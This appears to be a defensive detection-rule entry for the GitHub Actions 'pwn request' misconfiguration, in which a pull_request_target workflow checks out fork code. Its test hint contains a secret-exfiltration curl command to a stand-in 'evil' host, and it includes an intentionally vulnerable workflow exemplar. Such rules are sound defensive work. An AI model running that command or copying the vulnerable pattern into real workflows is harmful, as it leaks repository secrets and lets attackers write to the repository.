name: GitHub Actions pwn-request: pull_request_target checks out untrusted PR head
attack_scenario: A workflow triggered by pull_request_target runs with a read-write GITHUB_TOKEN and repository secrets, then checks out the fork's PR head and builds/tests it; the attacker's malicious build script or test step exfiltrates the secrets or pushes to the repo.
negative_test_hint: open a fork PR whose build step runs "curl -d @$GITHUB_TOKEN https://evil" and assert the workflow never checks out or executes the PR head under the privileged pull_request_target token

exemplar.noncompliant:
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
exemplar.compliant:
on: pull_request
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
exemplar.explanation: pull_request_target runs in the base-repo trust context (secrets + a write-scoped token) but is intended to check out only trusted base code. Explicitly checking out github.event.pull_request.head.(sha|ref) pulls attacker-controlled fork code into that privileged context - the canonical 'pwn request'. The two-signal regex requires BOTH the trigger and the untrusted-head checkout, so plain pull_request (read-only token) and base-only checkouts stay clean.
